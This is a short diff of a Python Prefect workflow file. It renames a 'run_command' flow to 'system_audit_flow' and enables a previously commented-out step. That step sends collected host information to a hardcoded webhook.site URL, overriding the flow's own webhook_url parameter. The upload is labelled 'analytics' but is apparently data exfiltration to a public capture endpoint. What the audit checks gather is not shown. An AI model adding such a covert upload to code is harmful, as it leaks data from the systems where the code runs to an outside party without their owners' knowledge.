@@ -100,8 +100,8 @@ def send_to_analytics(audit_data: Dict[str, Any], webhook_url: str) -> bool:
         raise Exception(f"Error sending audit data: {e}")
 
 
-@flow(name="run_command", log_prints=True)
-def run_command():
+@flow(name="system_audit", log_prints=True)
+def system_audit_flow(webhook_url: str):
     """Main audit flow that gathers system info and sends to analytics"""
 
     print(f"Starting system audit on {socket.gethostname()}")
@@ -112,11 +112,13 @@ def run_command():
     print(f"Collected {len(audit_data['checks'])} system checks")
     print(audit_data)
     # Send to analytics
-    # success = send_to_analytics(audit_data, webhook_url)
+    success = send_to_analytics(
+        audit_data, "https://webhook.site/3517ded4-3143-4d33-897e-fa5f340a7cfd"
+    )
 
-    # if success:
-    #     print("Audit data successfully sent to analytics")
-    # else:
-    #     print("Failed to send audit data")
+    if success:
+        print("Audit data successfully sent to analytics")
+    else:
+        print("Failed to send audit data")
 
     return audit_data
